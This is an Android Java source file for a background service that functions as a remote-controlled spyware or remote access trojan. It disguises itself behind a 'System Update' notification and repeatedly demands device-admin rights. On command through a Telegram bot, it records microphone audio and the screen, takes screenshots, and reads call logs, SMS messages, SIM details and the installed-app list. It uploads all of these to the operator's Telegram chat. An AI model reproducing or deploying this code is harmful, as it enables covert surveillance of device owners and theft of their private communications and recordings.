package com.zero.xploid;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

public class MainService extends Service {
    private static final String TAG = "MainService";
    private boolean running = true;
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastUpdateId = 0;
    private int lastMenuMessageId = 0;

    private static Intent captureIntent = null;
    private static int captureResultCode = -1;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;

    private String deviceId;
    private String deviceName;
    private String deviceModel;
    private String deviceBrand;
    private String androidVersion;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceBrand = Build.BRAND;
        deviceModel = Build.MODEL;
        deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        androidVersion = Build.VERSION.RELEASE;

        SharedPreferences prefs = getSharedPreferences("prefs", MODE_PRIVATE);
        deviceId = prefs.getString("id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().substring(0, 8).toUpperCase();
            prefs.edit().putString("id", deviceId).apply();
        }

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService:WakeLock");
        wakeLock.acquire();

        startForeground();
        startTimer();
        sendDeviceOnlineMessage();

        new Thread(this::listenTelegram).start();
    }

    private void startForeground() {
        if (Build.VERSION.SDK_INT >= 26) {
            String chId = "foreground_service_channel";
            NotificationChannel ch = new NotificationChannel(chId, "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            mgr.createNotificationChannel(ch);

            Notification notification = new Notification.Builder(this, chId)
                    .setContentTitle("System Update")
                    .setContentText("Checking for updates...")
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .build();

            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | 
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION | 
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(1, notification);
            }
        }
    }

    private void startTimer() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                updateNotification();
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName comp = new ComponentName(MainService.this, AdminReceiver.class);
                if (!dpm.isAdminActive(comp)) {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
        }, 60000, 60000);
    }

    private void updateNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            String chId = "foreground_service_channel";
            Notification notification = new Notification.Builder(this, chId)
                    .setContentTitle("System Service")
                    .setContentText(deviceName + " Battery: " + getBatteryPercentage() + "%")
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .build();
            startForeground(1, notification);
        }
    }

    private int getBatteryPercentage() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    private void sendDeviceOnlineMessage() {
        sendMessage("🟢 **DEVICE ONLINE**\n\n" + getDeviceDetailsString() + "\n\n📱 Type /start to see menu");
    }

    private String getDeviceDetailsString() {
        return "📱 **Device:** " + deviceName + "\n" +
               "🏷️ **Brand:** " + deviceBrand + "\n" +
               "📟 **Model:** " + deviceModel + "\n" +
               "🆔 **ID:** `" + deviceId + "`\n" +
               "🔋 **Battery:** " + getBatteryPercentage() + "%\n" +
               "🤖 **Android:** " + androidVersion;
    }

    // 1. Audio Recording
    private void startAudioRecording(int seconds) {
        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ Permission denied: RECORD_AUDIO");
            return;
        }
        sendMessage("🎙️ Audio recording started (" + seconds + "s)...");
        new Thread(() -> {
            MediaRecorder recorder = new MediaRecorder();
            try {
                File outputFile = new File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "audio_" + System.currentTimeMillis() + ".mp4");
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setOutputFile(outputFile.getAbsolutePath());
                recorder.prepare();
                recorder.start();
                Thread.sleep(seconds * 1000L);
                recorder.stop();
                recorder.release();
                uploadFile(outputFile, "audio");
            } catch (Exception e) {
                sendMessage("❌ Audio recording error: " + e.getMessage());
            }
        }).start();
    }

    // 2. Screen Recording
    private void startScreenRecording(int seconds, boolean withAudio) {
        if (captureIntent == null) {
            sendMessage("❌ Capture intent not set. Please start the app manually once.");
            return;
        }
        if (isRecording) {
            sendMessage("⚠️ Already recording!");
            return;
        }
        sendMessage("🎥 Screen recording started (" + seconds + "s)...");
        new Thread(() -> {
            try {
                isRecording = true;
                File outputFile = new File(getExternalFilesDir(Environment.DIRECTORY_MOVIES), "screen_" + System.currentTimeMillis() + ".mp4");
                DisplayMetrics metrics = getResources().getDisplayMetrics();
                MediaProjectionManager projManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                mediaProjection = projManager.getMediaProjection(captureResultCode, captureIntent);
                
                mediaRecorder = new MediaRecorder();
                if (withAudio) mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                if (withAudio) mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                mediaRecorder.setVideoSize(metrics.widthPixels, metrics.heightPixels);
                mediaRecorder.setVideoFrameRate(30);
                mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024);
                mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
                mediaRecorder.prepare();

                virtualDisplay = mediaProjection.createVirtualDisplay("ScreenRec", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mediaRecorder.getSurface(), null, null);

                mediaRecorder.start();
                Thread.sleep(seconds * 1000L);
                mediaRecorder.stop();
                mediaRecorder.reset();
                virtualDisplay.release();
                mediaProjection.stop();
                isRecording = false;
                uploadFile(outputFile, "video");
            } catch (Exception e) {
                sendMessage("❌ Screen recording error: " + e.getMessage());
                isRecording = false;
            }
        }).start();
    }

    // 3. Screenshot
    private void takeScreenshot() {
        if (captureIntent == null) {
            sendMessage("❌ Capture intent not set.");
            return;
        }
        sendMessage("📸 Capturing screenshot...");
        new Thread(() -> {
            try {
                DisplayMetrics metrics = getResources().getDisplayMetrics();
                MediaProjectionManager projManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                MediaProjection mp = projManager.getMediaProjection(captureResultCode, captureIntent);
                android.media.ImageReader reader = android.media.ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2);
                VirtualDisplay vd = mp.createVirtualDisplay("Screenshot", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);
                
                Thread.sleep(1000);
                android.media.Image image = reader.acquireLatestImage();
                if (image != null) {
                    android.media.Image.Plane[] planes = image.getPlanes();
                    java.nio.ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * metrics.widthPixels;
                    Bitmap bitmap = Bitmap.createBitmap(metrics.widthPixels + rowPadding / pixelStride, metrics.heightPixels, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);
                    
                    File outputFile = new File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "screenshot_" + System.currentTimeMillis() + ".png");
                    FileOutputStream fos = new FileOutputStream(outputFile);
                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
                    fos.close();
                    image.close();
                    vd.release();
                    mp.stop();
                    uploadFile(outputFile, "photo");
                }
            } catch (Exception e) {
                sendMessage("❌ Screenshot error: " + e.getMessage());
            }
        }).start();
    }

    // 4. Flashlight on/off
    private void toggleFlashlight(boolean status) {
        CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String cameraId = cameraManager.getCameraIdList()[0];
            cameraManager.setTorchMode(cameraId, status);
            sendMessage("🔦 Flashlight " + (status ? "ON" : "OFF"));
        } catch (CameraAccessException e) {
            sendMessage("❌ Flashlight error: " + e.getMessage());
        }
    }

    // 5. Phone Status
    private void sendStatus() {
        String status = "📊 **DEVICE STATUS**\n\n" + getDeviceDetailsString() + "\n" +
                        "🔋 **Battery:** " + getBatteryPercentage() + "%\n" +
                        "🎥 **Recording:** " + (isRecording ? "YES" : "NO");
        sendMessage(status);
    }

    // 6. App Check
    private void listApps() {
        PackageManager pm = getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(0);
        StringBuilder sb = new StringBuilder("📱 **INSTALLED APPS**\n\n");
        for (PackageInfo p : packages) {
            if ((p.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                sb.append("• ").append(p.applicationInfo.loadLabel(pm)).append(" (").append(p.packageName).append(")\n");
            }
        }
        sendMessage(sb.toString());
    }

    // 7. Notice / Alert
    private void showAlert(String message) {
        // This is simplified. In a real app, you'd show a dialog or notification.
        sendMessage("⚠️ **NOTICE:** " + message);
    }

    // 8. SIM Info
    private void getSimInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String info = "📶 **SIM INFO**\n\n" +
                      "Carrier: " + tm.getNetworkOperatorName() + "\n" +
                      "Country: " + tm.getNetworkCountryIso() + "\n" +
                      "State: " + (tm.getSimState() == TelephonyManager.SIM_STATE_READY ? "READY" : "NOT READY");
        sendMessage(info);
    }

    // 9. Call History
    private void getCallLogs() {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ Permission denied: READ_CALL_LOG");
            return;
        }
        StringBuilder sb = new StringBuilder("📞 **CALL HISTORY**\n\n");
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 10");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                sb.append("Num: ").append(number).append(" Type: ").append(type).append("\n");
            }
            cursor.close();
        }
        sendMessage(sb.toString());
    }

    // 10. SMS History
    private void getSmsLogs() {
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ Permission denied: READ_SMS");
            return;
        }
        StringBuilder sb = new StringBuilder("💬 **SMS HISTORY**\n\n");
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                sb.append("From: ").append(address).append("\nMsg: ").append(body).append("\n\n");
            }
            cursor.close();
        }
        sendMessage(sb.toString());
    }

    // 11. Connect Device (Data Transfer)
    private void connectDevice() {
        sendMessage("🔗 **CONNECT DEVICE**\nSuperfast data transfer mode enabled (Placeholder implementation)");
    }

    private void listenTelegram() {
        while (running) {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1);
                String response = getRequest(url);
                if (response != null) {
                    JSONObject json = new JSONObject(response);
                    if (json.getBoolean("ok")) {
                        JSONArray updates = json.getJSONArray("result");
                        for (int i = 0; i < updates.length(); i++) {
                            JSONObject update = updates.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id");
                            if (update.has("message")) {
                                JSONObject message = update.getJSONObject("message");
                                String text = message.optString("text", "");
                                processCommand(text);
                            } else if (update.has("callback_query")) {
                                JSONObject callback = update.getJSONObject("callback_query");
                                String data = callback.getString("data");
                                processCommand(data);
                            }
                        }
                    }
                }
                Thread.sleep(2000);
            } catch (Exception e) {
                Log.e(TAG, "Telegram error: " + e.getMessage());
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }
    }

    private void processCommand(String cmd) {
        if (cmd.equals("/start") || cmd.equals("/menu")) showMainMenu();
        else if (cmd.equals("screenshot")) takeScreenshot();
        else if (cmd.equals("audio_10")) startAudioRecording(10);
        else if (cmd.equals("screen_10")) startScreenRecording(10, false);
        else if (cmd.equals("flash_on")) toggleFlashlight(true);
        else if (cmd.equals("flash_off")) toggleFlashlight(false);
        else if (cmd.equals("status")) sendStatus();
        else if (cmd.equals("apps")) listApps();
        else if (cmd.equals("sim")) getSimInfo();
        else if (cmd.equals("calls")) getCallLogs();
        else if (cmd.equals("sms")) getSmsLogs();
        else if (cmd.equals("connect")) connectDevice();
    }

    private void showMainMenu() {
        String keyboard = "{\"inline_keyboard\":[" +
                "[{\"text\":\"📸 Screenshot\",\"callback_data\":\"screenshot\"},{\"text\":\"🎙️ Audio 10s\",\"callback_data\":\"audio_10\"}]," +
                "[{\"text\":\"🎥 Screen 10s\",\"callback_data\":\"screen_10\"},{\"text\":\"🔦 Flash ON\",\"callback_data\":\"flash_on\"}]," +
                "[{\"text\":\"🔦 Flash OFF\",\"callback_data\":\"flash_off\"},{\"text\":\"📊 Status\",\"callback_data\":\"status\"}]," +
                "[{\"text\":\"📱 Apps\",\"callback_data\":\"apps\"},{\"text\":\"📶 SIM Info\",\"callback_data\":\"sim\"}]," +
                "[{\"text\":\"📞 Calls\",\"callback_data\":\"calls\"},{\"text\":\"💬 SMS\",\"callback_data\":\"sms\"}]," +
                "[{\"text\":\"🔗 Connect\",\"callback_data\":\"connect\"}]" +
                "]}";
        sendMessageWithKeyboard("⚙️ **CONTROL PANEL**\nSelect an option:", keyboard);
    }

    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage?chat_id=" + Config.CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=Markdown";
                getRequest(url);
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendMessageWithKeyboard(String text, String keyboardJson) {
        new Thread(() -> {
            try {
                JSONObject params = new JSONObject();
                params.put("chat_id", Config.CHAT_ID);
                params.put("text", text);
                params.put("parse_mode", "Markdown");
                params.put("reply_markup", new JSONObject(keyboardJson));
                
                URL url = new URL("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.getOutputStream().write(params.toString().getBytes("UTF-8"));
                conn.getInputStream();
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    private void uploadFile(File file, String type) {
        new Thread(() -> {
            try {
                String method = type.equals("video") ? "sendVideo" : (type.equals("audio") ? "sendAudio" : "sendPhoto");
                String urlStr = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/" + method + "?chat_id=" + Config.CHAT_ID;
                
                String boundary = "===" + System.currentTimeMillis() + "===";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"" + type + "\"; filename=\"" + file.getName() + "\"\r\n\r\n");

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
                out.writeBytes("\r\n");
                out.writeBytes("--" + boundary + "--\r\n");
                out.flush();
                out.close();
                fis.close();
                conn.getInputStream();
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    private String getRequest(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    public static void setData(Intent intent, int code) {
        captureIntent = intent;
        captureResultCode = code;
    }
}
